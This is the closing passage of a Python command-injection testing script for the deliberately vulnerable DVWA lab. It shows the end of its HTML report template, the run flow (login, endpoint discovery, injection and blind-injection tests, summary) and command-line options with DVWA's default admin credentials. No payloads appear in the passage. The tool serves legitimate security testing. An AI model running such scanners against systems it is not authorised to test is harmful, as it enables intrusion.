            <li><strong>Rate Limiting</strong>: Implement rate limiting to prevent automated attacks</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Command_Injection">OWASP Testing Guide - OTG-INPVAL-013</a></li>
            <li><a href="https://owasp.org/www-community/attacks/Command_Injection">OWASP Command Injection</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></li>
            <li><a href="https://owasp.org/www-community/attacks/Code_Injection">OWASP Code Injection</a></li>
            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA) Documentation</a></li>
        </ul>
    </div>

    <div class="footer">
        <p>Generated by DVWA Command Injection Testing Script | OWASP/OSCP-Style Report</p>
        <p>Report generated on: {timestamp}</p>
    </div>

    <script>
        function openTab(evt, tabName) {{
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {{
                tabcontent[i].style.display = "none";
            }}
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {{
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }}
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }}
    </script>
</body>
</html>"""
        
        # Write report to file
        try:
            os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"[+] HTML report saved to: {self.output_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def run(self):
        """Main execution method"""
        print("=== DVWA Command Injection Testing Script ===")
        print(f"Target: {self.base_url}")
        print(f"Output: {self.output_file}")
        print(f"Delay between requests: {self.delay}s")
        print()
        
        # Login to DVWA
        if not self.login():
            print("[-] Failed to login. Exiting.")
            return False
        
        # Discover endpoints
        self.discover_endpoints()
        
        if not self.endpoints:
            print("[-] No endpoints discovered. Exiting.")
            return False
        
        # Test Command Injection
        self.test_command_injection()
        
        # Test Blind Command Injection
        self.test_blind_command_injection()
        
        # Generate report
        self.generate_html_report()
        
        # Summary
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        command_injection_vuln = sum(1 for r in self.results if r.get('vuln_type') == 'Command Injection' and r.get('vulnerable', False))
        blind_injection_vuln = sum(1 for r in self.results if r.get('vuln_type') == 'Blind Command Injection' and r.get('vulnerable', False))
        
        total_tests = len(self.results)
        print(f"\n=== Test Summary ===")
        print(f"Total endpoints tested: {len(self.endpoints)}")
        print(f"Total tests conducted: {total_tests}")
        print(f"Command Injection vulnerabilities: {command_injection_vuln}")
        print(f"Blind Command Injection vulnerabilities: {blind_injection_vuln}")
        print(f"Total vulnerabilities: {vulnerable_count}")
        print(f"Security status: {'VULNERABLE' if vulnerable_count > 0 else 'SECURE'}")
        
        return True

def main():
    parser = argparse.ArgumentParser(description='DVWA Command Injection Testing Script (OTG-INPVAL-013)')
    parser.add_argument('--url', default='http://localhost/dvwa', help='DVWA base URL (default: http://localhost/dvwa)')
    parser.add_argument('--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('--output', default='reports/command_injection_report.html', help='Output HTML report file (default: reports/command_injection_report.html)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests in seconds (default: 1.0)')
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = DVWACommandInjectionTester(args.url, args.username, args.password, args.output, args.timeout, args.delay)
    
    # Run tests
    success = tester.run()
    
    if success:
        print(f"\n[+] Testing completed successfully!")
        print(f"[+] Check report: {args.output}")
    else:
        print(f"\n[-] Testing failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()